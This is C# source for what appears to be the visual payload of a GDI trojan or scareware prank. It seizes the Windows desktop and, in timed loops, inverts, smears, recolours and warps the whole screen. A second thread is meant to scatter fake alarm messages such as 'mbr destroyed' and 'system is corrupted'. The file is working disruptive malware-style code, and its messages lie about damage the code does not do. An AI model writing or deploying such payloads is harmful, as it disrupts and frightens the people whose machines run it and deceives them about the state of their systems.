using System;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Alonka;

public class Effect
{
    // Registration DLL
    [DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
    private static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
        int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc,
        int nWidthSrc, int nHeightSrc, Blendfunction blendFunction);
    
    [DllImport("gdi32.dll")]
    private static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
    
    [DllImport("gdi32.dll")]
    private static extern bool PlgBlt(IntPtr hdcDest, Point[] lpPoint, IntPtr hdcSrc,
        int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
        int yMask);
    
    [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DeleteObject(IntPtr hObject);
    
    [DllImport("user32.dll")]
    private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
    
    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr GetDC(IntPtr hWnd);
    
    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();
    
    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr hwnd);
    
    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(int crColor);
    
    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
    private static extern IntPtr CreateCompatibleDC(IntPtr hdc);
    
    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
    private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
    
    [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
    private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
    
    [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth,
        int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);
    
    [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
    private static extern bool DeleteDC(IntPtr hdc);
    
    [DllImport("User32.dll")]
    private static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

    // Creating Data Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct Point
    {
        public int X;
        public int Y;

        private Point(int x, int y)
        {
            X = x;
            Y = y;
        }

        public static implicit operator System.Drawing.Point(Point p)
        {
            return new System.Drawing.Point(p.X, p.Y);
        }

        public static implicit operator Point(System.Drawing.Point p)
        {
            return new Point(p.X, p.Y);
        }
    }

    private enum TernaryRasterOperations : uint
    {
        Srccopy = 0x00CC0020,
        Srcinvert = 0x00660046,
        Srcerase = 0x00440328,
        Notsrccopy = 0x00330008,
        Patinvert = 0x005A0049
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct Blendfunction
    {
        byte BlendOp;
        byte BlendFlags;
        byte SourceConstantAlpha;
        byte AlphaFormat;

        public Blendfunction(byte op, byte flags, byte alpha, byte format)
        {
            BlendOp = op;
            BlendFlags = flags;
            SourceConstantAlpha = alpha;
            AlphaFormat = format;
        }
    }

    // Clearing the screen from GDI effects
    private static void Clear_screen()
    {
        for (var num = 0; num < 10; num++)
        {
            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
            Thread.Sleep(10);
        }
    }
    
    // GDI effects
    public static void GDI_payloads()
    {
        var r = new Random();
        var count = 1000;
        var gdiText = false;
        var x = Screen.PrimaryScreen.Bounds.Width;
        var y = Screen.PrimaryScreen.Bounds.Height;
        var left = Screen.PrimaryScreen.Bounds.Left;
        var top = Screen.PrimaryScreen.Bounds.Top;
        var right = Screen.PrimaryScreen.Bounds.Right;
        var bottom = Screen.PrimaryScreen.Bounds.Bottom;

        var hwnd = GetDesktopWindow();
        var hdc = GetWindowDC(hwnd);
        var desktop = GetDC(IntPtr.Zero);
        var rndcolor = CreateSolidBrush(0);
        var mhdc = CreateCompatibleDC(hdc);
        var hbit = CreateCompatibleBitmap(hdc, x, y);
        var holdbit = SelectObject(mhdc, hbit);
        var lppoint = new Point[3];
        for (var num = 0; num < 100; num++)
        {
            hwnd = GetDesktopWindow();
            hdc = GetWindowDC(hwnd);
            BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.Notsrccopy);
            DeleteDC(hdc);
            if (count > 51)
                Thread.Sleep(count -= 50);
            else
                Thread.Sleep(50);
        }
        for (var num = 0; num < 300; num++)
        {
            hwnd = GetDesktopWindow();
            hdc = GetWindowDC(hwnd);
            BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.Notsrccopy);
            DeleteDC(hdc);
            int posX = Cursor.Position.X;
            int posY = Cursor.Position.Y;
            desktop = GetDC(IntPtr.Zero);
            ReleaseDC(IntPtr.Zero, desktop);
            Thread.Sleep(50);
        }
        for (var num = 0; num < 500; num++)
        {
            hwnd = GetDesktopWindow();
            hdc = GetWindowDC(hwnd);
            BitBlt(hdc, 0, r.Next(10), r.Next(x), y, hdc, 0, 0, TernaryRasterOperations.Srccopy);
            DeleteDC(hdc);
            if (r.Next(30) == 1)
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
            Thread.Sleep(r.Next(25));
        }
        Clear_screen();
        new Thread(() => GDI_payloads2(gdiText, x, y)).Start();
        for (var num = 0; num < 500; num++)
        {
            hwnd = GetDesktopWindow();
            hdc = GetWindowDC(hwnd);
            BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x / 2), r.Next(y / 2), hdc, 0, 0, TernaryRasterOperations.Notsrccopy);
            DeleteDC(hdc);
            Thread.Sleep(50);
        }
        Clear_screen();
        for (var num = 0; num < 700; num++)
        {
            switch (num)
            {
                case < 300:
                    hwnd = GetDesktopWindow();
                    hdc = GetWindowDC(hwnd);
                    rndcolor = CreateSolidBrush(r.Next(100000000));
                    SelectObject(hdc, rndcolor);
                    BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.Patinvert);
                    DeleteObject(rndcolor);
                    DeleteDC(hdc);
                    Thread.Sleep(50);
                    break;
                case < 500:
                    hwnd = GetDesktopWindow();
                    hdc = GetWindowDC(hwnd);
                    rndcolor = CreateSolidBrush(r.Next(100000000));
                    SelectObject(hdc, rndcolor);
                    BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.Patinvert);
                    BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, TernaryRasterOperations.Srcerase);
                    BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x / 2), r.Next(y / 2), hdc, 0, 0, TernaryRasterOperations.Notsrccopy);
                    DeleteObject(rndcolor);
                    DeleteDC(hdc);
                    Thread.Sleep(50);
                    break;
                default:
                    hwnd = GetDesktopWindow();
                    hdc = GetWindowDC(hwnd);
                    rndcolor = CreateSolidBrush(r.Next(100000000));
                    SelectObject(hdc, rndcolor);
                    BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.Patinvert);
                    BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, TernaryRasterOperations.Srcinvert);
                    DeleteObject(rndcolor);
                    DeleteDC(hdc);
                    Thread.Sleep(50);
                    break;
            }
        }
        Clear_screen();
        gdiText = true;
        for (int num = 0; num < 500; num++)
        {
            hwnd = GetDesktopWindow();
            hdc = GetWindowDC(hwnd);
            lppoint[0].X = left + r.Next(25);
            lppoint[0].Y = top + r.Next(25);
            lppoint[1].X = right - r.Next(25);
            lppoint[1].Y = top;
            lppoint[2].X = left + r.Next(25);
            lppoint[2].Y = bottom - r.Next(25);
            PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
            mhdc = CreateCompatibleDC(hdc);
            hbit = CreateCompatibleBitmap(hdc, x, y);
            holdbit = SelectObject(mhdc, hbit);
            if (r.Next(3) == 1)
                rndcolor = CreateSolidBrush(100);
            else if (r.Next(3) == 2)
                rndcolor = CreateSolidBrush(100000);
            else if (r.Next(3) == 0)
                rndcolor = CreateSolidBrush(100000000);
            SelectObject(mhdc, rndcolor);
            Rectangle(mhdc, left, top, right, bottom);
            AlphaBlend(hdc, 0, 0, x, y, mhdc, 0, 0, x, y, new Blendfunction(0, 0, 10, 0));
            SelectObject(mhdc, holdbit);
            DeleteObject(hbit);
            DeleteDC(hdc);
            Thread.Sleep(10);
        }
        Environment.Exit(-1);
    }

    private static void GDI_payloads2(bool gdi_text, int x, int y)
    {
        var hwnd = GetDesktopWindow();
        var hdc = GetWindowDC(hwnd);
        var desktop = GetDC(IntPtr.Zero);
        var num_count = 1000;
        var r = new Random();
        for (; ; )
        {
            if (!gdi_text)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, r.Next(20), r.Next(20), x, y, hdc, 0, 0, TernaryRasterOperations.Srccopy);
                DeleteDC(hdc);
                if (num_count > 51)
                    Thread.Sleep(num_count -= 50);
                else
                    Thread.Sleep(5);
            }
            else
            {
                desktop = GetDC(IntPtr.Zero);
                using var g = Graphics.FromHdc(desktop);
                string[] rndtext = { "?Where am I", "system is corrupted", "OMG", "mbr destroyed", "Reg fucked", "ABOBA" };
                var drawFont = new Font("Arial", r.Next(10, 70));
                var drawBrush = new SolidBrush(Color.Pink);
                var xp = r.Next(x);
                var yp = r.Next(y);
                var drawFormat = new StringFormat();
                drawFormat.FormatFlags = StringFormatFlags.DirectionRightToLeft;
                if (r.Next(5) == 0)
                {
                    g.DrawString(rndtext[r.Next(4)], drawFont, drawBrush, xp, yp, drawFormat);
                }
                ReleaseDC(IntPtr.Zero, desktop);
                Thread.Sleep(5);
            }
        }
    }
}